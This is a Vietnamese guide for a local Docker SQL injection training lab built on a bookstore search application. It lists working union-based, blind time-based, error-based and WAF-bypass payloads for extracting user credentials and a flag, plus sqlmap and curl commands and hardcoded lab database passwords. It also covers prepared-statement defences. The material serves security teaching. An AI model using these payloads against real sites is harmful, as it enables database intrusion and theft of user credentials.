# Hướng Dẫn Chi Tiết - SQL Injection Lab

## 🎯 Mục Tiêu Lab

Lab này được thiết kế để thực hành và hiểu rõ về lỗ hổng SQL Injection trong ứng dụng web thực tế. Thông qua một hệ thống quản lý sách trực tuyến, bạn sẽ học cách:

- **Nhận diện** các điểm có thể tấn công SQL Injection
- **Khai thác** lỗ hổng để lấy thông tin từ database  
- **Hiểu** tác động của SQLi đối với bảo mật ứng dụng
- **Áp dụng** các kỹ thuật phòng chống SQLi

## 🏗️ Kiến Trúc Hệ Thống

### 🐳 Docker Components
```
sqli_01_web (PHP 8.1 + Apache)
├── Port: 8082
├── Volume: ./src → /var/www/html
├── Environment: SQLI_VULN_FIELD, USER_EMAIL
└── Auto-restart: unless-stopped

sqli_01_db (MySQL 8.0)
├── Port: 3308
├── Database: bookstore_db
├── Volume: ./database → /docker-entrypoint-initdb.d
└── Auto-reset: mỗi 30 phút
```

### 📊 Database Schema
```sql
-- Bảng chính
users (id, username, email, password, name, role)
books (id, title, isbn, language, publication_year, pages, price, description)
authors (id, name, biography, birth_year, nationality)
publishers (id, name, address, founded_year)
categories (id, name, description)
reviews (id, book_id, user_id, rating, comment)

-- Bảng liên kết
book_authors, book_categories
```

## 🚀 Khởi Động Lab

### Cách 1: Khởi động đơn giản
```bash
./scripts/start_lab.sh
```

### Cách 2: Tùy chỉnh trường lỗ hổng
```bash
# Lỗ hổng ở trường title
./scripts/start_lab.sh title admin@test.com

# Lỗ hổng ở trường author  
./scripts/start_lab.sh author hacker@evil.com

# Lỗ hổng ở nhiều trường
./scripts/start_lab.sh book_info user@lab.local

### 📋 Bảng Mapping ENV - Giao Diện
| ENV Variable | Tên trên Giao Diện | Mô tả |
|--------------|--------------------|-------|
| `title` | **Tên sách** | Tìm kiếm theo tên sách |
| `author` | **Tác giả** | Tìm kiếm theo tên tác giả |
| `publisher` | **Nhà xuất bản** | Tìm kiếm theo NXB |
| `category` | **Thể loại** | Dropdown chọn thể loại |
| `year` | **Năm xuất bản** | Tìm kiếm theo năm |
| `isbn` | **ISBN** | Tìm kiếm theo mã ISBN |
| `language` | **Ngôn ngữ** | Dropdown chọn ngôn ngữ |
```

### Cách 3: Sử dụng Docker Compose trực tiếp
```bash
# QUAN TRỌNG: Phải dừng container cũ trước khi thay đổi ENV
docker compose down
ENV=title USER_EMAIL=test@domain.com docker compose up -d

# Hoặc các field khác
docker compose down && ENV=categories USER_EMAIL=student@fpt.edu.vn docker compose up -d
docker compose down && ENV=author USER_EMAIL=admin@lab.local docker compose up -d
```

⚠️ **Lưu ý**: Container phải được **restart** để biến môi trường mới có hiệu lực!

## 🎮 Trải Nghiệm Lab

### 🌐 Giao Diện Chính
- **URL**: http://localhost:8082
- **Mô tả**: Trang tìm kiếm sách với 7 trường khác nhau
- **Tính năng**: Tìm kiếm theo tiêu đề, tác giả, nhà xuất bản, thể loại, năm, ISBN, ngôn ngữ


# Kiểm tra: 



### 2️⃣ **Detect SQL Injection**
```sql
-- Test basic injection
' OR '1'='1

-- Test error-based
' OR 1=1 #

-- Test union-based (Query có 10 cột - dễ nhớ!)
' UNION SELECT 1,2,3,4,5,6,7,8,9,10 #

-- Test time-based
' OR SLEEP(5) #
```

### 🎯 **POC Đơn Giản cho Sinh Viên (10 cột dễ nhớ!)**
```sql
-- Bước 1: Detect SQL Injection (dùng giá trị không tồn tại để force hiển thị injection)
zzzzz' UNION SELECT 1,2,3,4,5,6,7,8,9,10 #

-- Bước 2: Lấy thông tin database  
zzzzz' UNION SELECT database(),user(),version(),4,5,6,7,8,9,10 #
-- Kết quả: sqli_01_lab, root@172.27.0.3, 8.0.44

-- Bước 3: Enum bảng trong database
zzzzz' UNION SELECT 1,table_name,3,4,5,6,7,8,9,10 FROM information_schema.tables WHERE table_schema=database() #

-- Bước 4: Enum cột của bảng users
zzzzz' UNION SELECT 1,column_name,3,4,5,6,7,8,9,10 FROM information_schema.columns WHERE table_name='users' #

-- Bước 5: Extract user credentials (Đây là mục tiêu chính!)
zzzzz' UNION SELECT 1,CONCAT('USER:',username),CONCAT('PASS:',password),CONCAT('EMAIL:',email),CONCAT('ROLE:',role),5,6,7,8,9,10 FROM users #
```

💡 **Mẹo cho sinh viên**: 
- Sử dụng `zzzzz'` thay vì `'` để đảm bảo không có kết quả hợp lệ, force hiển thị injection data
- Dùng `CONCAT()` để format output dễ đọc
- **Chỉ cần nhớ 10 cột** thay vì 17 cột phức tạp!

### 3️⃣ **Exploit Techniques**

#### 🔍 Union-Based SQLi
```sql
-- Tìm số cột (Query có 10 cột: 7 từ books + 3 từ join)
' UNION SELECT 1,2,3,4,5,6,7,8,9,10 #

-- Lấy thông tin database
' UNION SELECT database(),user(),version(),4,5,6,7,8,9,10 #

-- Enum tables
' UNION SELECT table_name,2,3,4,5,6,7,8,9,10 FROM information_schema.tables WHERE table_schema=database() #

-- Enum columns
' UNION SELECT column_name,2,3,4,5,6,7,8,9,10 FROM information_schema.columns WHERE table_name='users' #

-- Extract data
' UNION SELECT username,password,email,name,role,6,7,8,9,10 FROM users #
```

#### ⏱️ Time-Based Blind SQLi
```sql
-- Test delay
' OR IF(1=1,SLEEP(5),0) --

-- Brute force database name
' OR IF(SUBSTRING(database(),1,1)='b',SLEEP(3),0) --

-- Extract admin password length
' OR IF(LENGTH((SELECT password FROM users WHERE role='admin'))>10,SLEEP(3),0) --

-- Extract password character by character
' OR IF(ASCII(SUBSTRING((SELECT password FROM users WHERE role='admin'),1,1))>90,SLEEP(3),0) --
```

#### 📊 Error-Based SQLi
```sql
-- Trigger error with data
' OR (SELECT COUNT(*) FROM (SELECT 1 UNION SELECT 2 UNION SELECT 3)x GROUP BY CONCAT(database(),FLOOR(RAND(0)*2))) --

-- Extract using XMLHttpRequest
' OR EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database()),0x7e)) --

-- Get user info via error
' OR (SELECT * FROM (SELECT COUNT(*),CONCAT(database(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --
```

### 4️⃣ **Advanced Techniques**

#### 🔄 Bypassing WAF/Filters
```sql
-- Comment variations
' OR 1=1 #
' OR 1=1 /*comment*/
' OR 1=1 ;%00

-- Case variations  
' oR 1=1 --
' Or 1=1 --
' OR 1=1 --

-- Encoding
' OR 1%3D1 --  (URL encoded)
' %4FR 1=1 --  (O encoded)

-- Double encoding
' %254FR 1=1 --

-- Unicode  
' ＯＲ 1=1 --
```

#### 🎯 Target-Specific Payloads
```sql
-- Dành cho trường title
Harry Potter' OR '1'='1

-- Dành cho trường year
2023' OR '1'='1' OR publication_year='

-- Dành cho trường isbn  
978-' OR 1=1 OR isbn LIKE '

-- Multi-field attack (extract user data)
test' AND 1=2 UNION SELECT username,password,email,name,role,6,7,8,9,10 FROM users #
```

## 🎯 Challenges & Objectives

### 🥉 **Beginner Level**
1. **Tìm lỗ hổng**: Xác định trường nào có thể bị SQLi
2. **Basic injection**: Thực hiện SQLi đơn giản để bypass tìm kiếm
3. **Error analysis**: Phân tích error messages để hiểu database structure

### 🥈 **Intermediate Level**  
4. **Database enumeration**: Liệt kê tất cả tables và columns
5. **Data extraction**: Lấy thông tin users từ database
6. **Admin access**: Sử dụng SQLi để đăng nhập admin

### 🥇 **Advanced Level**
7. **Blind SQLi**: Thực hiện tấn công khi không có error messages
8. **Time-based**: Sử dụng time delay để extract data
9. **Bypass protection**: Vượt qua các filter/WAF mechanism
10. **Get FLAG**: Lấy được FLAG từ admin panel


## 🛡️ Phòng Chống SQLi

### ✅ **Prepared Statements**
```php
// ❌ Vulnerable code
$query = "SELECT * FROM books WHERE title LIKE '%$title%'";

// ✅ Secure code  
$query = "SELECT * FROM books WHERE title LIKE ?";
$stmt = $pdo->prepare($query);
$stmt->execute(["%$title%"]);
```

### ✅ **Input Validation**
```php
// Whitelist validation
$allowed_fields = ['title', 'author', 'isbn'];
if (!in_array($field, $allowed_fields)) {
    die('Invalid field');
}

// Type validation
$year = filter_var($_GET['year'], FILTER_VALIDATE_INT);
if ($year === false && $_GET['year'] !== '') {
    die('Invalid year format');
}
```

### ✅ **Output Encoding**
```php
// HTML encoding
echo htmlspecialchars($user_input, ENT_QUOTES, 'UTF-8');

// SQL escaping (not recommended as primary defense)
$escaped = mysqli_real_escape_string($connection, $user_input);
```

## 🔧 Quản Lý Lab

### 📊 **Monitoring**
```bash
# Xem SQLi attempts real-time
docker exec sqli_01_web tail -f /var/log/sqli_attempts.log

# Kiểm tra database logs
docker exec sqli_01_db mysql -u root -proot123 -e "SHOW PROCESSLIST;"

# Container status
docker compose ps
```

### 🔄 **Reset Lab**
```bash
# Reset hoàn toàn
./scripts/reset_lab.sh

# Restart services
docker compose restart

# Rebuild từ đầu
docker compose down -v && docker compose up -d --build
```

### 🐛 **Debugging**
```bash
# Check application logs
docker compose logs -f web

# Check database logs  
docker compose logs -f db

# Access container shell
docker exec -it sqli_01_web bash
docker exec -it sqli_01_db mysql -u root -proot123
```

## 📚 **Resources & References**

### 🔗 **SQL Injection Cheatsheets**
- [PortSwigger SQLi Cheatsheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- [OWASP SQLi Prevention](https://owasp.org/www-community/attacks/SQL_Injection)
- [PayloadsAllTheThings SQLi](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)

### 🛠️ **Useful Tools**
```bash
# SQLMap - Automated SQLi tool
sqlmap -u "http://localhost:8082/" --forms --batch --level=5 --risk=3

# Burp Suite - Web vulnerability scanner
# Use with proxy on 127.0.0.1:8080

# Manual testing với curl
curl -X POST "http://localhost:8082/" -d "title=test' OR 1=1 --"


###
# Câu lệnh kiểm tra có những DB nào 
  test' UNION SELECT 1, schema_name, 2, 3, 3, 4, 5, 6, 7, 8 FROM information_schema.schemata #

## Câu lệnh kiểm tra có những table nào

test' UNION SELECT  1, table_name, 2, 3, 4, 5, 6, 7, 8, 9 FROM information_schema.tables WHERE table_schema = 'sqli_01_lab' # 

# Câu lệnh kiểm tra bảng Flags có những cột nào

test' UNION SELECT  1, column_name, 2, 3, 4, 5, 6, 7, 8, 9 FROM information_schema.columns WHERE table_schema = 'sqli_01_lab'   AND table_name = 'flags' #


# Câu lệnh lấy giá trị FLAG1
test' UNION SELECT  1, flag_value, flag_name, 3, 4, 5, 6, 7, 8, 9 FROM sqli_01_lab.flags #